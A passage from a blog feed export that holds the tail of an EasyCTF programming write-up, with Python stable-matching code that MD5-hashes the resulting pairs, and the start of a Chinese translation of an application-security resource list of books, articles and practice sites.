class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#https://www.youtube.com/watch?v=Qcv1IqHWAzg</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(maleFile,femaleFile,reverse)</span>:</span></div><div class="line">    <span class="comment">#These -10000's and such are to pad the array,</span></div><div class="line">    <span class="comment">#so nth id represents nth index</span></div><div class="line">    males = [[<span class="number">-10000</span>]]</div><div class="line">    maleIDNameMap = &#123;&#125;</div><div class="line">    females = [[<span class="number">-10000</span>]]</div><div class="line">    femaleIDNameMap = &#123;&#125;</div><div class="line">    loadData(males,maleIDNameMap,maleFile)</div><div class="line">    loadData(females,femaleIDNameMap,femaleFile)</div><div class="line">    <span class="comment">#Format is that the man's index is there id, and inside is [x,y] where y is id of person they're paired with,</span></div><div class="line">    <span class="comment"># and x is his rank for that person, rank being 0-based</span></div><div class="line">    manCurrentAssignments = [[<span class="number">1000000</span>,<span class="number">-1000</span>]]*len(males)</div><div class="line">    unassignedWomenIDs = list(range(<span class="number">1</span>,len(females)))</div><div class="line">    <span class="keyword">while</span>(len(unassignedWomenIDs) != <span class="number">0</span>):</div><div class="line">        <span class="comment">#use i, so I don't ahve to worry about modifying list while looping through it.</span></div><div class="line">        i = len(unassignedWomenIDs) - <span class="number">1</span></div><div class="line">        <span class="keyword">while</span>(i &gt;= <span class="number">0</span>):</div><div class="line">            womanID = unassignedWomenIDs[i]</div><div class="line">            i-=<span class="number">1</span></div><div class="line">            <span class="comment">#pop so that I don't check same combo again later.</span></div><div class="line">            nextPrefferedManID = females[womanID].pop(<span class="number">0</span>)</div><div class="line"></div><div class="line">            thisWomanPrefferenceRank = males[nextPrefferedManID].index(womanID)</div><div class="line"></div><div class="line">            <span class="keyword">if</span>(manCurrentAssignments[nextPrefferedManID][<span class="number">0</span>] &gt; thisWomanPrefferenceRank):</div><div class="line">                <span class="comment"># assign this woman to this man</span></div><div class="line">                <span class="keyword">del</span> unassignedWomenIDs[i+<span class="number">1</span>]</div><div class="line">                oldAssigneeID = manCurrentAssignments[nextPrefferedManID][<span class="number">1</span>]</div><div class="line">                <span class="keyword">if</span>(oldAssigneeID==<span class="number">-1000</span>):</div><div class="line">                    <span class="comment">#ezpz</span></div><div class="line">                    manCurrentAssignments[nextPrefferedManID] = [thisWomanPrefferenceRank,womanID]</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    <span class="comment">#gotta kick off old woman, and try everything in range 1... cur</span></div><div class="line">                    <span class="comment">#except I'm doing something clever and only keeping men she hasn't tried on listRef</span></div><div class="line">                    <span class="comment">#so program may just iterate a few more times. No recursive dealing with kicking off more</span></div><div class="line">                    <span class="comment">#and more women.</span></div><div class="line">                    unassignedWomenIDs.append(oldAssigneeID)</div><div class="line">                    manCurrentAssignments[nextPrefferedManID] = [thisWomanPrefferenceRank,womanID]</div><div class="line"></div><div class="line">    output = []</div><div class="line">    <span class="keyword">if</span>(reverse):</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(males)):</div><div class="line">            output.append([femaleIDNameMap[manCurrentAssignments[i][<span class="number">1</span>]],maleIDNameMap[i]])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(males)):</div><div class="line">            output.append([maleIDNameMap[i],femaleIDNameMap[manCurrentAssignments[i][<span class="number">1</span>]]])</div><div class="line">    <span class="keyword">return</span> output</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">loadData</span><span class="params">(listRef,idRef,fname)</span>:</span></div><div class="line">    lines = []</div><div class="line">    <span class="keyword">with</span> open(fname) <span class="keyword">as</span> f:</div><div class="line">        lines = f.readlines()</div><div class="line"></div><div class="line">    i = <span class="number">1</span></div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</div><div class="line">        elements = line.split(<span class="string">' '</span>)</div><div class="line">        idRef[i] = elements[<span class="number">0</span>]</div><div class="line">        tmp = []</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,len(elements)):</div><div class="line">            tmp.append(int(elements[k][:<span class="number">-1</span>]))</div><div class="line">        listRef.append(tmp)</div><div class="line">        i += <span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line">maleFirst   = main(<span class="string">'male'</span>,<span class="string">'female'</span>,<span class="keyword">False</span>)</div><div class="line">femaleFirst = main(<span class="string">'female'</span>,<span class="string">'male'</span>,<span class="keyword">True</span> )</div><div class="line"></div><div class="line">toMD5 = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> maleFirst:</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> femaleFirst:</div><div class="line">        <span class="keyword">if</span>(i[<span class="number">0</span>] == j[<span class="number">0</span>]):</div><div class="line">            <span class="keyword">if</span>(i[<span class="number">1</span>]==j[<span class="number">1</span>]):</div><div class="line">                toMD5.append(i)</div><div class="line"></div><div class="line"><span class="comment"># For MD5</span></div><div class="line">md5String = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> toMD5:</div><div class="line">    md5String += <span class="string">"(%s,%s)"</span> %(i[<span class="number">0</span>], i[<span class="number">1</span>])</div><div class="line">print(md5String)</div><div class="line">md5 = hashlib.md5(md5String.encode()).hexdigest()</div><div class="line">print(md5)</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> misc </tag>
            
            <tag> miscellaneous </tag>
            
            <tag> ctf writeup </tag>
            
            <tag> easyctf </tag>
            
            <tag> programming </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[超棒应用程序安全清单]]></title>
      <url>/2017/04/08/%E8%B6%85%E6%A3%92%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E6%B8%85%E5%8D%95/</url>
      <content type="html"><![CDATA[<h1 id="超棒应用程序安全清单"><a href="#超棒应用程序安全清单" class="headerlink" title="超棒应用程序安全清单 "></a>超棒应用程序安全清单 <a href="https://github.com/sindresorhus/awesome" target="_blank" rel="external"><img src="https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg" alt="Awesome"></a></h1><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><a href="https://www.hackfun.org/" target="_blank" rel="external">Personal Blog</a></p><p><a href="https://github.com/sunnyelf/awesome-application-security" target="_blank" rel="external">Github Adress</a></p><p><a href="https://github.com/paragonie/awesome-appsec" target="_blank" rel="external">English Version</a></p><h1 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h1><p><a href="https://github.com/paragonie/awesome-appsec" target="_blank" rel="external">English Version</a></p><p>学习应用程序安全的资源列表，包含书籍，网站，博客文章和自我评估测验等，由<a href="https://paragonie.com" target="_blank" rel="external">Paragon Initiative Enterprises</a>公司维护，由应用安全开发社区贡献，我们<a href="https://paragonie.com/projects" target="_blank" rel="external">其他社区项目</a>可能对未来的应用安全领域也有用哦，如果你是应用安全的小白，那可能会从<a href="https://paragonie.com/blog/2015/08/gentle-introduction-application-security" target="_blank" rel="external">深入浅出讲应用安全</a>一文中受益。</p><h1 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h1><p><a href="https://github.com/paragonie/awesome-appsec/blob/master/CONTRIBUTING.md" target="_blank" rel="external">请参考贡献指南了解详情</a>.</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li><a href="#通用">通用</a><ul><li><a href="#文章">文章</a><ul><li><a href="#如何安全地生成随机数-2014"><a href="http://sockpuppet.org/blog/2014/02/25/safely-generate-random-numbers/" target="_blank" rel="external">如何安全地生成随机数</a> (2014)</a></li><li><a href="#加盐哈希密码的正确姿势-2014"><a href="https://crackstation.net/hashing-security.htm" target="_blank" rel="external">加盐哈希密码的正确姿势</a> (2014)</a></li><li><a href="#devurandom不当使用-2014"><a href="http://insanecoding.blogspot.co.uk/2014/05/a-good-idea-with-bad-usage-devurandom.html" target="_blank" rel="external">/dev/urandom不当的使用</a> (2014)</a></li><li><a href="#why-invest-in-application-security-2015"><a href="https://paragonie.com/white-paper/2015-why-invest-application-security" target="_blank" rel="external">Why Invest in Application Security?</a> (2015)</a></li><li><a href="#警惕多次使用一次性密钥和其他奇葩的加密方式-2015"><a href="https://freedom-to-tinker.com/blog/jbonneau/be-wary-of-one-time-pads-and-other-crypto-unicorns/" target="_blank" rel="external">警惕多次使用一次性密钥和其他奇葩的加密方式</a> (2015)</a></li></ul></li><li><a href="#书籍">书籍</a><ul><li><a href="#作为一个渗透测试学习者必知必读的好书推荐"><a href="https://zhuanlan.zhihu.com/p/23561475" target="_blank" rel="external">作为一个渗透测试学习者必知必读的好书推荐</a></a></li><li><a href="#作为一个二进制安全学习者必知必读的书籍推荐"><a href="https://zhuanlan.zhihu.com/p/23574346" target="_blank" rel="external">作为一个二进制安全学习者必知必读的书籍推荐</a></a></li><li><a href="#-web应用黑客手册-2011"><a href="http://mdsec.net/wahh" target="_blank" rel="external">Web应用黑客手册</a> (2011)</a></li><li><a href="#-密码学工程设计原理与实践应用--2010"><a href="http://www.amazon.com/Cryptography-Engineering-Principles-Practical-Applications/dp/0470474246" target="_blank" rel="external">密码学工程：设计原理与实践应用 </a>(2010)</a></li><li><a href="#-python灰帽子黑客与逆向工程师的python编程之道-2009"><a href="http://www.amazon.com/Gray-Hat-Python-Programming-Engineers/dp/1593271921" target="_blank" rel="external">Python灰帽子：黑客与逆向工程师的Python编程之道</a> (2009)</a></li><li><a href="#-软件安全评估的艺术识别与防范软件-2006"><a href="http://www.amazon.com/The-Software-Security-Assessment-Vulnerabilities/dp/0321444426/" target="_blank" rel="external">软件安全评估的艺术:识别与防范软件</a> (2006)</a></li><li><a href="#-c语言接口与实现创建可重用软件的技术-1996"><a href="http://www.amazon.com/Interfaces-Implementations-Techniques-Creating-Reusable/dp/0201498413/" target="_blank" rel="external">C语言接口与实现：创建可重用软件的技术</a> (1996)</a></li><li><a href="#-逆向逆向工程的秘密-2005"><a href="http://www.amazon.com/Reversing-Secrets-Engineering-Eldad-Eilam/dp/0764574817" target="_blank" rel="external">逆向：逆向工程的秘密</a> (2005)</a></li><li><a href="#-javascript语言精粹-2008"><a href="http://www.amazon.com/JavaScript-Good-Parts-Douglas-Crockford/dp/0596517742" target="_blank" rel="external">JavaScript语言精粹</a> (2008)</a></li><li><a href="#-windows内部实现囊括windows-server-2008和windows-vista-2007"><a href="http://www.amazon.com/Windows®-Internals-Including-Developer-Reference/dp/0735625301" target="_blank" rel="external">Windows内部实现:囊括Windows Server 2008和Windows Vista</a> (2007)</a></li><li><a href="#-mac黑客手册-2009"><a href="http://www.amazon.com/The-Hackers-Handbook-Charlie-Miller/dp/0470395362" target="_blank" rel="external">Mac黑客手册</a> (2009)</a></li><li><a href="#-ida-pro权威指南世界上最受欢迎反汇编者的非正式指南-2008"><a href="http://www.amazon.com/The-IDA-Pro-Book-Disassembler/dp/1593271786" target="_blank" rel="external">IDA Pro权威指南:世界上最受欢迎反汇编者的非正式指南</a> (2008)</a></li><li><a href="#-用tcpip进行网际互连第2卷设计实现与内核ansi-c版第3版-1998"><a href="http://www.amazon.com/Internetworking-TCP-Vol-Implementation-Internals/dp/0139738436" target="_blank" rel="external">用TCP/IP进行网际互连（第2卷）：设计、实现与内核（ANSI C版）（第3版）</a> (1998)</a></li><li><a href="#-网络算法设计快速网络设备的跨学科方法-2004"><a href="http://www.amazon.com/Network-Algorithmics-Interdisciplinary-Designing-Networking/dp/0120884771" target="_blank" rel="external">网络算法：设计快速网络设备的跨学科方法</a> (2004)</a></li><li><a href="#-计算机结构-麻省理工学院电子电气工程与计算机科学系教材-1989"><a href="http://www.amazon.com/Computation-Structures-Electrical-Engineering-Computer/dp/0262231395" target="_blank" rel="external">计算机结构 (麻省理工学院电子电气工程与计算机科学系教材)</a> (1989)</a></li><li><a href="#-软件加密与解密-2009"><a href="http://www.amazon.com/Surreptitious-Software-Obfuscation-Watermarking-Tamperproofing/dp/0321549252" target="_blank" rel="external">软件加密与解密</a> (2009)</a></li><li><a href="#安全编程开发安全程序-2015"><a href="http://www.dwheeler.com/secure-programs/" target="_blank" rel="external">安全编程：开发安全程序</a> (2015)</a></li><li><a href="#安全工程构建可靠分布式系统指南第二版-2008"><a href="https://www.cl.cam.ac.uk/~rja14/book.html" target="_blank" rel="external">安全工程：构建可靠分布式系统指南（第二版）</a> (2008)</a></li><li><a href="#-防弹ssl和tls理解和部署ssltls和pki以保护服务器和web应用安全-2014"><a href="https://www.feistyduck.com/books/bulletproof-ssl-and-tls/" target="_blank" rel="external">防弹SSL和TLS：理解和部署SSL/TLS和PKI以保护服务器和Web应用安全</a> (2014)</a></li></ul></li><li><a href="#课程">课程</a><ul><li><a href="#计算机安全攻击cis-4930fsu"><a href="https://www.cs.fsu.edu/~redwood/OffensiveComputerSecurity/" target="_blank" rel="external">计算机安全攻击（CIS 4930）FSU</a></a></li><li><a href="#黑客之夜"><a href="https://github.com/isislab/Hack-Night" target="_blank" rel="external">黑客之夜</a></a></li></ul></li><li><a href="#网站">网站</a><ul><li><a href="#hack-this-site"><a href="http://www.hackthissite.org" target="_blank" rel="external">Hack This Site!</a></a></li><li><a href="#enigma-group"><a href="http://www.enigmagroup.org" target="_blank" rel="external">Enigma Group</a></a></li><li><a href="#web-app-sec-quiz"><a href="https://timoh6.github.io/WebAppSecQuiz/" target="_blank" rel="external">Web App Sec Quiz</a></a></li><li><a href="#securepasswordsinfo"><a href="https://securepasswords.info" target="_blank" rel="external">SecurePasswords.info</a></a></li><li><a href="#security-news-feeds-cheat-sheet"><a href="http://lzone.de/cheat-sheet/Security-News-Feeds" target="_blank" rel="external">Security News Feeds Cheat-Sheet</a></a></li><li><a href="#open-security-training"><a href="http://opensecuritytraining.info/" target="_blank" rel="external">Open Security Training</a></a></li><li><a href="#microcorruption"><a href="https://microcorruption.com/login" target="_blank" rel="external">MicroCorruption</a></a></li><li><a href="#the-matasano-crypto-challenges"><a href="http://cryptopals.com" target="_blank" rel="external">The Matasano Crypto Challenges</a></a></li><li><a href="#pentesterlab"><a href="https://pentesterlab.com" target="_blank" rel="external">PentesterLab</a></a></li><li><a href="#juice-shop"><a href="https://bkimminich.github.io/juice-shop" target="_blank" rel="external">Juice Shop</a></a></li><li><a href="#supercar-showdown"><a href="http://hackyourselffirst.troyhunt.com/" target="_blank" rel="external">Supercar Showdown</a></a></li><li><a href="#博客">博客</a><ul><li><a href="#crypto-fails"><a href="http://cryptofails.com" target="_blank" rel="external">Crypto Fails</a></a></li><li><a href="#ncc-group"><a href="https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/" target="_blank" rel="external">NCC Group</a></a></li><li><a href="#scott-helme"><a href="https://scotthelme.co.uk" target="_blank" rel="external">Scott Helme</a></a></li></ul></li><li><a href="#wiki">Wiki</a><ul><li><a href="#owasp-top-ten-project"><a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" target="_blank" rel="external">OWASP Top Ten Project</a></a></li></ul></li><li><a href="#工具">工具</a><ul><li><a href="#qualys-ssl-labs"><a href="https://www.ssllabs.com/" target="_blank" rel="external">Qualys SSL Labs</a></a></li><li><a href="#securityheadersio"><a href="https://securityheaders.io/" target="_blank" rel="external">securityheaders.io</a></a></li><li><a href="#report-uriio"><a href="https://report-uri.io" target="_blank" rel="external">report-uri.io</a></a></li></ul></li></ul></li></ul></li><li><a href="#android">Android</a><ul><li><a href="#书籍-1">书籍</a><ul><li><a href="#android安全编码标准-2015"><a href="https://www.securecoding.cert.org/confluence/display/android/Android Secure Coding Standard" target="_blank" rel="external">Android安全编码标准</a> (2015)</a></li></ul></li></ul></li><li><a href="#c">C</a><ul><li><a href="#书籍-2">书籍</a><ul><li><a href="#c安全编码标准-2006"><a href="https://www.securecoding.cert.org/confluence/display/c/SEI CERT C Coding Standard" target="_blank" rel="external">C安全编码标准</a> (2006)</a></li><li><a href="#防御性编码fedora安全团队提高软件安全指南-2016"><a href="https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Defensive_Coding/index.html" target="_blank" rel="external">防御性编码：Fedora安全团队提高软件安全指南</a> (2016)</a></li></ul></li></ul></li><li><a href="#c-1">C</a><ul><li><a href="#书籍-3">书籍</a><ul><li><a href="#c安全编码标准-2006-1"><a href="https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=637" target="_blank" rel="external">C 安全编码标准</a> (2006)</a></li></ul></li></ul></li><li><a href="#c-sharp">C Sharp</a><ul><li><a href="#书籍-4">书籍</a><ul><li><a href="#-安全驱动net-2015"><a href="http://securitydriven.net/" target="_blank" rel="external">安全驱动.NET</a> (2015)</a></li></ul></li></ul></li><li><a href="#java">Java</a><ul><li><a href="#书籍-5">书籍</a><ul><li><a href="#java安全编码标准-2007"><a href="https://www.securecoding.cert.org/confluence/display/java/SEI CERT Oracle Coding Standard for Java" target="_blank" rel="external">Java安全编码标准</a> (2007)</a></li><li><a href="#java-se安全编指南-2014"><a href="http://www.oracle.com/technetwork/java/seccodeguide-139067.html" target="_blank" rel="external">Java SE安全编指南</a> (2014)</a></li></ul></li></ul></li><li><a href="#nodejs">Node.js</a><ul><li><a href="#文章-1">文章</a><ul><li><a href="#nodejs安全检查清单-2015"><a href="https://blog.risingstack.com/node-js-security-checklist/" target="_blank" rel="external">Node.js安全检查清单</a> (2015)</a></li></ul></li><li><a href="#培训">培训</a><ul><li><a href="#-lift-security团队的安全培训"><a href="https://liftsecurity.io/training" target="_blank" rel="external">Lift Security团队的安全培训</a></a></li></ul></li></ul></li><li><a href="#perl">Perl</a><ul><li><a href="#书籍-6">书籍</a><ul><li><a href="#perl安全编码标准-2011"><a href="https://www.securecoding.cert.org/confluence/display/perl/SEI CERT Perl Coding Standard" target="_blank" rel="external">Perl安全编码标准</a> (2011)</a></li></ul></li></ul></li><li><a href="#python">Python</a><ul><li><a href="#书籍-7">书籍</a><ul><li><a href="#fedora防御编码指南中的python章节"><a href="https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Defensive_Coding/chap-Defensive_Coding-Python.html" target="_blank" rel="external">Fedora防御编码指南中的Python章节</a></a></li><li><a href="#-violent-python"><a href="http://www.amazon.com/Violent-Python-Cookbook-Penetration-Engineers/dp/1597499579" target="_blank" rel="external">Violent Python</a></a></li></ul></li><li><a href="#网站-1">网站</a><ul><li><a href="#开放式web应用程序安全项目中的python安全wiki-2014"><a href="https://github.com/ebranca/owasp-pysec/wiki" target="_blank" rel="external">开放式Web应用程序安全项目中的Python安全Wiki</a> (2014)</a></li></ul></li></ul></li><li><a href="#ruby">Ruby</a><ul><li><a href="#书籍-8">书籍</a><ul><li><a href="#ruby安全开发指南-2014"><a href="https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Secure_Ruby_Development_Guide/index.html" target="_blank" rel="external">Ruby安全开发指南</a> (2014)</a></li></ul></li></ul></li><li><a href="#php">PHP</a><ul><li><a href="#文章-2">文章</a><ul><li><a href="#关于时间的一切-2014"><a href="http://blog.ircmaxell.com/2014/11/its-all-about-time.html" target="_blank" rel="external">关于时间的一切</a> (2014)</a></li><li><a href="#实现php长期持久性安全认证-2015"><a href="https://paragonie.com/blog/2015/04/secure-authentication-php-with-long-term-persistence" target="_blank" rel="external">实现PHP长期持久性安全认证</a> (2015)</a></li><li><a href="#php中防止跨站脚本攻击20个点子-2013"><a href="http://blog.astrumfutura.com/2013/04/20-point-list-for-preventing-cross-site-scripting-in-php" target="_blank" rel="external">PHP中防止跨站脚本攻击20个点子</a> (2013)</a></li><li><a href="#针对系统管理员最佳php安全配置25点建议-2011"><a href="http://www.cyberciti.biz/tips/php-security-best-practices-tutorial.html" target="_blank" rel="external">针对系统管理员最佳PHP安全配置25点建议</a> (2011)</a></li><li><a href="#php数据加密入门介绍-2014"><a href="https://timoh6.github.io/2014/06/16/PHP-data-encryption-cheatsheet.html" target="_blank" rel="external">PHP数据加密入门介绍</a> (2014)</a></li><li><a href="#php应用程序防止sql注入简明指南-2014"><a href="https://paragonie.com/blog/2015/05/preventing-sql-injection-in-php-applications-easy-and-definitive-guide" target="_blank" rel="external">PHP应用程序防止SQL注入简明指南</a> (2014)</a></li><li><a href="#你不该使用base64密码-2015"><a href="https://paragonie.com/blog/2015/08/you-wouldnt-base64-a-password-cryptography-decoded" target="_blank" rel="external">你不该使用Base64密码</a> (2015)</a></li><li><a href="#php应用程序安全数据加密指南-2015"><a href="https://paragonie.com/white-paper/2015-secure-php-data-encryption" target="_blank" rel="external">PHP应用程序安全数据加密指南</a> (2015)</a></li></ul></li><li><a href="#书籍-9">书籍</a><ul><li><a href="#-php安全核心理念"><a href="https://leanpub.com/securingphp-coreconcepts" target="_blank" rel="external">PHP安全：核心理念</a></a></li><li><a href="#php项目中使用libsodium"><a href="https://paragonie.com/book/pecl-libsodium" target="_blank" rel="external">PHP项目中使用Libsodium</a></a></li></ul></li><li><a href="#干货库">干货库</a><ul><li><a href="#defusephp-encryption"><a href="https://github.com/defuse/php-encryption" target="_blank" rel="external">defuse/php-encryption</a></a></li><li><a href="#ircmaxellpassword_compat"><a href="https://github.com/ircmaxell/password_compat" target="_blank" rel="external">ircmaxell/password_compat</a></a></li><li><a href="#ircmaxellrandomlib"><a href="https://github.com/ircmaxell/RandomLib" target="_blank" rel="external">ircmaxell/RandomLib</a></a></li><li><a href="#thephpleagueoauth2-server"><a href="https://github.com/thephpleague/oauth2-server" target="_blank" rel="external">thephpleague/oauth2-server</a></a></li><li><a href="#paragonierandom_compat"><a href="https://github.com/paragonie/random_compat" target="_blank" rel="external">paragonie/random_compat</a></a></li><li><a href="#pseciogatekeeper"><a href="https://github.com/psecio/gatekeeper" target="_blank" rel="external">psecio/gatekeeper</a></a></li><li><a href="#openwallphpass"><a href="http://www.openwall.com/phpass/" target="_blank" rel="external">openwall/phpass</a></a></li></ul></li><li><a href="#网站-2">网站</a><ul><li><a href="#websecio"><a href="http://websec.io" target="_blank" rel="external">websec.io</a></a></li><li><a href="#博客-1">博客</a><ul><li><a href="#paragon-initiative-enterprises-blog"><a href="https://paragonie.com/blog/" target="_blank" rel="external">Paragon Initiative Enterprises Blog</a></a></li><li><a href="#ircmaxells-blog"><a href="http://blog.ircmaxell.com" target="_blank" rel="external">ircmaxell’s blog</a></a></li><li><a href="#pádraic-bradys-blog"><a href="http://blog.astrumfutura.com" target="_blank" rel="external">Pádraic Brady’s Blog</a></a></li></ul></li><li><a href="#订阅-1">订阅</a><ul><li><a href="#securing-php-weekly"><a href="http://securingphp.com" target="_blank" rel="external">Securing PHP Weekly</a></a></li></ul></li></ul></li></ul></li></ul><a id="more"></a><h1 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><h3 id="如何安全地生成随机数-2014"><a href="#如何安全地生成随机数-2014" class="headerlink" title="如何安全地生成随机数 (2014)"></a><a href="http://sockpuppet.org/blog/2014/02/25/safely-generate-random-numbers/" target="_blank" rel="external">如何安全地生成随机数</a> (2014)</h3><p>关于加密安全中的伪随机数生成器的建议。</p><h3 id="加盐哈希密码的正确姿势-2014"><a href="#加盐哈希密码的正确姿势-2014" class="headerlink" title="加盐哈希密码的正确姿势 (2014)"></a><a href="https://crackstation.net/hashing-security.htm" target="_blank" rel="external">加盐哈希密码的正确姿势</a> (2014)</h3><p><a href="https://crackstation.net" target="_blank" rel="external">Crackstation</a>上的一篇文章, <a href="https://defuse.ca" target="_blank" rel="external">Defuse Security</a>的一个项目。</p><h3 id="dev-urandom不当使用-2014"><a href="#dev-urandom不当使用-2014" class="headerlink" title="/dev/urandom不当使用 (2014)"></a><a href="http://insanecoding.blogspot.co.uk/2014/05/a-good-idea-with-bad-usage-devurandom.html" target="_blank" rel="external">/dev/urandom不当使用</a> (2014)</h3><p>在Linux/BSD上提及了许多使 <code>/dev/urandom</code>失效的方法。</p><h3 id="Why-Invest-in-Application-Security-2015"><a href="#Why-Invest-in-Application-Security-2015" class="headerlink" title="Why Invest in Application Security? (2015)"></a><a href="https://paragonie.com/white-paper/2015-why-invest-application-security" target="_blank" rel="external">Why Invest in Application Security?</a> (2015)</h3><p>经营业务需要具有成本意识，并尽量减少不必要的支出。确保您的应用程序的安全性的好处对于大多数公司来说是不可见的，因此通常他们忽视投资于安全软件开发作为一种节省成本的措施，然而这些公司并没有意识到的潜在的数据泄露威胁，<strong>平均数据泄露造成数百万美元的损失</strong>，因此对于大多数公司来说投入更多的时间和人力开发安全软件是值得的，能尽量减少这种风险。</p><h3 id="警惕多次使用一次性密钥和其他奇葩的加密方式-2015"><a href="#警惕多次使用一次性密钥和其他奇葩的加密方式-2015" class="headerlink" title="警惕多次使用一次性密钥和其他奇葩的加密方式 (2015)"></a><a href="https://freedom-to-tinker.com/blog/jbonneau/be-wary-of-one-time-pads-and-other-crypto-unicorns/" target="_blank" rel="external">警惕多次使用一次性密钥和其他奇葩的加密方式</a> (2015)</h3><p>任何想要够建立加密功能的开发者<strong>必读</strong>的好文。</p><h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><h3 id="作为一个渗透测试学习者必知必读的好书推荐"><a href="#作为一个渗透测试学习者必知必读的好书推荐" class="headerlink" title="作为一个渗透测试学习者必知必读的好书推荐"></a><a href="https://zhuanlan.zhihu.com/p/23561475" target="_blank" rel="external">作为一个渗透测试学习者必知必读的好书推荐</a></h3><h3 id="作为一个二进制安全学习者必知必读的书籍推荐"><a href="#作为一个二进制安全学习者必知必读的书籍推荐" class="headerlink" title="作为一个二进制安全学习者必知必读的书籍推荐"></a><a href="https://zhuanlan.zhihu.com/p/23574346" target="_blank" rel="external">作为一个二进制安全学习者必知必读的书籍推荐</a></h3><h3 id="Web应用黑客手册-2011"><a href="#Web应用黑客手册-2011" class="headerlink" title="Web应用黑客手册 (2011)"></a><a href="http://mdsec.net/wahh" target="_blank" rel="external">Web应用黑客手册</a> (2011)</h3><h3 id="密码学工程：设计原理与实践应用-2010"><a href="#密码学工程：设计原理与实践应用-2010" class="headerlink" title="密码学工程：设计原理与实践应用  (2010)"></a><a href="http://www.amazon.com/Cryptography-Engineering-Principles-Practical-Applications/dp/0470474246" target="_blank" rel="external">密码学工程：设计原理与实践应用 </a>(2010)</h3><h3 id="Python灰帽子：黑客与逆向工程师的Python编程之道-2009"><a href="#Python灰帽子：黑客与逆向工程师的Python编程之道-2009" class="headerlink" title="Python灰帽子：黑客与逆向工程师的Python编程之道 (2009)"></a><a href="http://www.amazon.com/Gray-Hat-Python-Programming-Engineers/dp/1593271921" target="_blank" rel="external">Python灰帽子：黑客与逆向工程师的Python编程之道</a> (2009)</h3><h3 id="软件安全评估的艺术-识别与防范软件-2006"><a href="#软件安全评估的艺术-识别与防范软件-2006" class="headerlink" title="软件安全评估的艺术:识别与防范软件 (2006)"></a><a href="http://www.amazon.com/The-Software-Security-Assessment-Vulnerabilities/dp/0321444426/" target="_blank" rel="external">软件安全评估的艺术:识别与防范软件</a> (2006)</h3><h3 id="C语言接口与实现：创建可重用软件的技术-1996"><a href="#C语言接口与实现：创建可重用软件的技术-1996" class="headerlink" title="C语言接口与实现：创建可重用软件的技术 (1996)"></a><a href="http://www.amazon.com/Interfaces-Implementations-Techniques-Creating-Reusable/dp/0201498413/" target="_blank" rel="external">C语言接口与实现：创建可重用软件的技术</a> (1996)</h3><h3 id="逆向：逆向工程的秘密-2005"><a href="#逆向：逆向工程的秘密-2005" class="headerlink" title="逆向：逆向工程的秘密 (2005)"></a><a href="http://www.amazon.com/Reversing-Secrets-Engineering-Eldad-Eilam/dp/0764574817" target="_blank" rel="external">逆向：逆向工程的秘密</a> (2005)</h3><h3 id="JavaScript语言精粹-2008"><a href="#JavaScript语言精粹-2008" class="headerlink" 